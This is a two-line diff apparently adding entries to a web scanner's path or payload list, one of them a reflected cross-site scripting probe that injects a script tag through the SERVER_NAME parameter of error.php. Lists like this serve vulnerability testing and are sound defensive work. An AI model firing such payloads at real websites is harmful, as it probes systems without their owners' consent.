@@ -1,0 +1,2 @@
+/
+/error.php?SERVER_NAME=<script>alert(document.domain)</script>
